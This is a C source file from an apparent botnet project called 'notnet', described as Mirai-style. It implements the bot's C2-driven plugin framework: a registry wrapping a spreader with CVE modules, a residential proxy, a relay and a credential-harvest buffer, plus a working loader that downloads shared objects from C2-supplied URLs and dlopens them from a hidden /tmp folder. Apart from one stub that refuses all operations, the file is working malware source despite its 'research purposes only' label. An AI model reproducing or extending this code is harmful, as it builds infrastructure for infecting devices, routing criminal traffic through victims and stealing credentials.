/*
 * notnet - Modern Mirai-Style Botnet
 * plugin.c - Loader/plugin framework (#92)
 *
 * The Bredolab/Emotet model: the core bot stays a minimal loader and
 * capabilities are pushed post-infection, dispatched by name from the
 * C2. v1 implements the built-in registry — spread, proxy, relay, and
 * cred-log are compile-time linked plugins; the C2 `plugin` command
 * drives their lifecycle (load/run/unload/status). Existing module
 * behavior is unchanged: the plugins merely wrap the modules' own
 * entry points (spread_local, proxy_start/stop, relay_start/stop).
 *
 * Remote fetch of shared-object plugins (the full Bredolab/Emotet
 * pattern) is implemented — `plugin fetch <name> <url> <sha256>` — using
 * the fail-closed SHA-256 pinning of the payload path (payload_sha256).
 *
 * Research purposes only.
 */
#include "plugin.h"
#include "spread.h"
#include "proxy.h"
#include "relay.h"
#include "util.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <unistd.h>
#include <sys/stat.h>
#include <dlfcn.h>

/* ── Built-in plugin callbacks ─────────────────────────────── */

/* spread: multi-vector spreader + known-CVE modules (#83). Stateless —
 * the main loop already runs spread_local() when the primary C2 is
 * unreachable; the plugin entry lets the C2 trigger a cycle on demand.
 * load/unload are no-ops (there is nothing to initialize or stop). */
static int plg_spread_load(notnet_bot_t *bot, void *ctx) { (void)bot; (void)ctx; return 0; }
static int plg_spread_run(notnet_bot_t *bot, void *ctx) { (void)ctx; return spread_local(bot); }
static int plg_spread_unload(notnet_bot_t *bot, void *ctx) { (void)bot; (void)ctx; return 0; }

/* proxy: residential SOCKS5 forward proxy (#89). run starts the
 * accept thread (fail-closed: refused without a proxy_token), unload
 * stops it. */
static int plg_proxy_load(notnet_bot_t *bot, void *ctx) { (void)bot; (void)ctx; return 0; }
static int plg_proxy_run(notnet_bot_t *bot, void *ctx) { (void)ctx; return proxy_start(bot); }
static int plg_proxy_unload(notnet_bot_t *bot, void *ctx) { (void)bot; (void)ctx; proxy_stop(); return 0; }

/* relay: ORB-style single-hop relay (#91). Same lifecycle as the
 * proxy — run starts the token-authenticated listener, unload stops
 * it. */
static int plg_relay_load(notnet_bot_t *bot, void *ctx) { (void)bot; (void)ctx; return 0; }
static int plg_relay_run(notnet_bot_t *bot, void *ctx) { (void)ctx; return relay_start(bot); }
static int plg_relay_unload(notnet_bot_t *bot, void *ctx) { (void)bot; (void)ctx; relay_stop(); return 0; }

/* cred-log: smash-and-grab credential buffer (#90). Passive — the
 * spreaders feed it, so there is nothing to start or stop; the plugin
 * entry exists so the C2 manages the capability uniformly and
 * `plugin status` reports the buffered harvest. */
static int plg_creds_load(notnet_bot_t *bot, void *ctx) { (void)bot; (void)ctx; return 0; }
static int plg_creds_run(notnet_bot_t *bot, void *ctx) { (void)bot; (void)ctx; return 0; }
static int plg_creds_unload(notnet_bot_t *bot, void *ctx) { (void)bot; (void)ctx; return 0; }

/* byovd: BYOVD defense-neutralization scaffold (#94). Defensive-only —
 * this repo deliberately ships NO driver-loading code. BYOVD
 * (bring-your-own-vulnerable-driver) is the commodity successor to
 * kernel rootkits (ESET catalogued ~90 EDR killers, 54 abusing a shared
 * pool of 35 legitimately signed drivers), but loading signed drivers is
 * Windows-only and would be weaponized code; the research stance is
 * document + detect, never deploy. Every op refuses with a clear log so
 * the C2 sees an explicit refusal instead of silent success, and boot
 * auto-load leaves it unloaded. When byovd_guard=1 the load callback
 * additionally reports that BYOVD-style driver abuse is blocked. */
static int plg_byovd_load(notnet_bot_t *bot, void *ctx) {
    (void)ctx;
    log_warn("PLUGIN: byovd load refused - driver loading is not implemented "
             "on this platform (defensive-only scaffold, see references/byovd.md)");
    if (bot && bot->byovd_guard) {
        log_info("PLUGIN: byovd guard active - BYOVD-style driver abuse is blocked");
    }
    return -1;
}
static int plg_byovd_run(notnet_bot_t *bot, void *ctx) {
    (void)bot; (void)ctx;
    log_warn("PLUGIN: byovd run refused - no driver-loading capability exists");
    return -1;
}
static int plg_byovd_unload(notnet_bot_t *bot, void *ctx) {
    (void)bot; (void)ctx;
    log_warn("PLUGIN: byovd unload refused - never loaded, nothing to stop");
    return -1;
}

/* ── Registry ──────────────────────────────────────────────── */
static notnet_plugin_t g_plugins[PLUGIN_MAX_REGISTRY];
static int g_plugin_count = 0;

void plugin_init(void) {
    if (g_plugin_count > 0) return;   /* idempotent */

    g_plugins[g_plugin_count++] = (notnet_plugin_t){
        "spread", "multi-vector spreader + CVE modules (#83)",
        plg_spread_load, plg_spread_run, plg_spread_unload, 0, NULL, NULL };
    g_plugins[g_plugin_count++] = (notnet_plugin_t){
        "proxy", "residential SOCKS5 forward proxy (#89)",
        plg_proxy_load, plg_proxy_run, plg_proxy_unload, 0, NULL, NULL };
    g_plugins[g_plugin_count++] = (notnet_plugin_t){
        "relay", "ORB-style single-hop relay (#91)",
        plg_relay_load, plg_relay_run, plg_relay_unload, 0, NULL, NULL };
    g_plugins[g_plugin_count++] = (notnet_plugin_t){
        "cred-log", "credential-log harvest buffer (#90)",
        plg_creds_load, plg_creds_run, plg_creds_unload, 0, NULL, NULL };
    g_plugins[g_plugin_count++] = (notnet_plugin_t){
        "byovd", "BYOVD defense scaffold (#94) - defensive-only, refuses all ops",
        plg_byovd_load, plg_byovd_run, plg_byovd_unload, 0, NULL, NULL };

    log_info("PLUGIN: registry initialized (%d built-in plugins)",
             g_plugin_count);
}

void plugin_load_all(notnet_bot_t *bot) {
    for (int i = 0; i < g_plugin_count; i++) {
        if (g_plugins[i].loaded) continue;
        if (g_plugins[i].load && g_plugins[i].load(bot, g_plugins[i].ctx) == 0) {
            g_plugins[i].loaded = 1;
        } else {
            log_warn("PLUGIN: %s not loaded at boot (load refused)",
                     g_plugins[i].name);
        }
    }
    log_info("PLUGIN: %d/%d built-in plugins loaded",
             plugin_loaded_count(), g_plugin_count);
}

notnet_plugin_t *plugin_find(const char *name) {
    if (!name) return NULL;
    for (int i = 0; i < g_plugin_count; i++) {
        if (strcmp(g_plugins[i].name, name) == 0) {
            return &g_plugins[i];
        }
    }
    return NULL;
}

int plugin_load(notnet_bot_t *bot, const char *name) {
    notnet_plugin_t *p = plugin_find(name);
    if (!p) return -1;
    if (p->loaded) {
        log_warn("PLUGIN: %s already loaded", name);
        return -1;
    }
    if (p->load && p->load(bot, p->ctx) != 0) {
        log_warn("PLUGIN: %s load callback failed", name);
        return -1;
    }
    p->loaded = 1;
    log_info("PLUGIN: %s loaded", name);
    return 0;
}

int plugin_run(notnet_bot_t *bot, const char *name) {
    notnet_plugin_t *p = plugin_find(name);
    if (!p) return -1;
    if (!p->loaded) {
        log_warn("PLUGIN: %s run refused - not loaded", name);
        return -1;
    }
    if (p->run && p->run(bot, p->ctx) != 0) {
        log_warn("PLUGIN: %s run failed", name);
        return -1;
    }
    log_info("PLUGIN: %s ran", name);
    return 0;
}

int plugin_unload(notnet_bot_t *bot, const char *name) {
    notnet_plugin_t *p = plugin_find(name);
    if (!p) return -1;
    if (!p->loaded) {
        log_warn("PLUGIN: %s unload refused - not loaded", name);
        return -1;
    }
    if (p->unload && p->unload(bot, p->ctx) != 0) {
        log_warn("PLUGIN: %s unload callback failed", name);
        return -1;
    }
    p->loaded = 0;
    log_info("PLUGIN: %s unloaded", name);
    return 0;
}

/* Teardown every loaded plugin via its unload (stop) callback —
 * proxy_stop()/relay_stop() are idempotent, so double-stops from the
 * boot-time accept threads and the C2 `kill` path are safe. A failing
 * callback is logged and the plugin is still marked unloaded (kill
 * must not wedge on a stubborn plugin). */
void plugin_unload_all(notnet_bot_t *bot) {
    for (int i = 0; i < g_plugin_count; i++) {
        if (!g_plugins[i].loaded) continue;
        if (g_plugins[i].unload && g_plugins[i].unload(bot, g_plugins[i].ctx) != 0) {
            log_warn("PLUGIN: %s unload callback failed during teardown",
                     g_plugins[i].name);
        }
        g_plugins[i].loaded = 0;
        log_info("PLUGIN: %s unloaded", g_plugins[i].name);
    }
    log_info("PLUGIN: all plugins unloaded (%d/%d)",
             g_plugin_count - plugin_loaded_count(), g_plugin_count);
}

void plugin_status(char *buf, size_t len) {
    if (!buf || len == 0) return;
    size_t off = 0;
    for (int i = 0; i < g_plugin_count && off < len; i++) {
        int n;
        if (strcmp(g_plugins[i].name, "cred-log") == 0) {
            n = snprintf(buf + off, len - off, "%s[%s] %s (buffered: %u)\n",
                         g_plugins[i].loaded ? "*" : " ", g_plugins[i].name,
                         g_plugins[i].description, spread_cred_count());
        } else {
            n = snprintf(buf + off, len - off, "%s[%s] %s\n",
                         g_plugins[i].loaded ? "*" : " ", g_plugins[i].name,
                         g_plugins[i].description);
        }
        if (n < 0) break;
        if ((size_t)n >= len - off) break;   /* truncated — stop writing */
        off += (size_t)n;
    }
    buf[off] = '\0';
}

int plugin_count(void) {
    return g_plugin_count;
}

int plugin_loaded_count(void) {
    int n = 0;
    for (int i = 0; i < g_plugin_count; i++) {
        if (g_plugins[i].loaded) n++;
    }
    return n;
}

/* ── Remote shared-object plugins (dlopen) ─────────────────── */

#define PLUGIN_REMOTE_DIR "/tmp/.notnet-plugins"
#define PLUGIN_REMOTE_MAX (1024 * 1024)   /* fetched .so size cap */

typedef int (*plugin_entry_fn)(const char *op, char *out, size_t out_sz);

static void remote_path(const char *name, char *buf, size_t sz) {
    snprintf(buf, sz, PLUGIN_REMOTE_DIR "/%s.so", name);
}

static int remote_call(void *entry, const char *op) {
    plugin_entry_fn fn = (plugin_entry_fn)entry;
    char out[256] = {0};
    int r = fn(op, out, sizeof(out));
    if (out[0]) log_info("PLUGIN: remote %s: %s", op, out);
    return (r == 0) ? 0 : -1;
}

static int remote_plg_load(notnet_bot_t *bot, void *ctx) { (void)bot; return remote_call(ctx, "load"); }
static int remote_plg_run(notnet_bot_t *bot, void *ctx) { (void)bot; return remote_call(ctx, "run"); }
static int remote_plg_unload(notnet_bot_t *bot, void *ctx) { (void)bot; return remote_call(ctx, "unload"); }

static int valid_name(const char *name) {
    if (!name || name[0] == '\0') return 0;
    size_t n = strlen(name);
    if (n >= PLUGIN_NAME_MAX) return 0;
    for (size_t i = 0; i < n; i++) {
        char c = name[i];
        if (c == '/' || c == '\\' || c == ' ' || c == '\t' || c == '.') return 0;
    }
    return 1;
}

static int valid_sha256(const char *hex) {
    if (!hex || strlen(hex) != 64) return 0;
    for (int i = 0; i < 64; i++) {
        if (!isxdigit((unsigned char)hex[i])) return 0;
    }
    return 1;
}

int plugin_fetch_remote(notnet_bot_t *bot, const char *name,
                        const char *url, const char *sha256_pin) {
    if (!bot) return -1;
    if (!valid_name(name)) {
        log_warn("PLUGIN: fetch refused — bad plugin name");
        return -1;
    }
    if (!url || (strncmp(url, "http://", 7) != 0 && strncmp(url, "https://", 8) != 0)) {
        log_warn("PLUGIN: fetch refused — url must be http:// or https://");
        return -1;
    }
    if (!valid_sha256(sha256_pin)) {
        log_warn("PLUGIN: fetch refused — sha256 pin must be 64 hex chars");
        return -1;
    }
    if (plugin_find(name)) {
        log_warn("PLUGIN: fetch refused — %s already registered", name);
        return -1;
    }
    if (g_plugin_count >= PLUGIN_MAX_REGISTRY) {
        log_warn("PLUGIN: fetch refused — registry full (%d)", PLUGIN_MAX_REGISTRY);
        return -1;
    }

    mkdir(PLUGIN_REMOTE_DIR, 0700);
    char path[512];
    remote_path(name, path, sizeof(path));

    /* 1. Download (streamed; http_download handles http:// and https://,
     * the latter upgrading to TLS when pinned). Rejects non-2xx.
     * Returns the body length on success (> 0), -1 on failure. */
    int dlrc = http_download(bot, url, path);
    if (dlrc < 0) {
        log_error("PLUGIN: fetch %s download failed: %s", name, url);
        unlink(path);
        return -1;
    }

    /* 2. Verify the SHA-256 pin (fail-closed, same as payload_sha256). */
    unsigned char *data = NULL;
    int dlen = file_read_max(path, &data, PLUGIN_REMOTE_MAX);
    if (dlen <= 0 || !data) {
        log_error("PLUGIN: fetch %s read failed", name);
        unlink(path);
        return -1;
    }
    char actual[65];
    if (sha256_hex(data, (size_t)dlen, actual) != 0 ||
        strcmp(actual, sha256_pin) != 0) {
        log_error("PLUGIN: fetch %s SHA-256 mismatch — expected %s got %s",
                  name, sha256_pin, actual[0] ? actual : "(hash failed)");
        free(data);
        unlink(path);
        return -1;
    }
    free(data);

    /* 3. dlopen + resolve the entry point. */
    void *handle = dlopen(path, RTLD_NOW | RTLD_LOCAL);
    if (!handle) {
        log_error("PLUGIN: fetch %s dlopen failed: %s", name, dlerror());
        unlink(path);
        return -1;
    }
    void *entry = dlsym(handle, "plugin_entry");
    if (!entry) {
        log_error("PLUGIN: fetch %s no plugin_entry symbol: %s", name, dlerror());
        dlclose(handle);
        unlink(path);
        return -1;
    }

    /* 4. Register (name/description heap copies — freed by drop). */
    char *name_copy = strdup(name);
    char *desc_copy = strdup("remote shared-object plugin (SHA-256 pinned)");
    if (!name_copy || !desc_copy) {
        free(name_copy);
        free(desc_copy);
        dlclose(handle);
        unlink(path);
        log_error("PLUGIN: fetch %s out of memory", name);
        return -1;
    }
    g_plugins[g_plugin_count++] = (notnet_plugin_t){
        name_copy, desc_copy,
        remote_plg_load, remote_plg_run, remote_plg_unload,
        1, entry, handle };
    log_info("PLUGIN: fetched %s from %s (SHA-256 verified, dlopen ok)",
             name, url);
    return 0;
}

int plugin_drop_remote(notnet_bot_t *bot, const char *name) {
    if (!bot || !name) return -1;
    notnet_plugin_t *p = plugin_find(name);
    if (!p) {
        log_warn("PLUGIN: drop %s — unknown", name);
        return -1;
    }
    if (!p->handle) {
        log_warn("PLUGIN: drop %s refused — built-in, use unload", name);
        return -1;
    }
    if (p->loaded && p->unload) p->unload(bot, p->ctx);
    void *handle = p->handle;
    char path[512];
    remote_path(name, path, sizeof(path));

    int idx = (int)(p - g_plugins);
    free((void *)p->name);
    free((void *)p->description);
    for (int i = idx; i < g_plugin_count - 1; i++) {
        g_plugins[i] = g_plugins[i + 1];
    }
    g_plugin_count--;

    dlclose(handle);
    unlink(path);
    log_info("PLUGIN: dropped %s (dlclose + removed %s)", name, path);
    return 0;
}
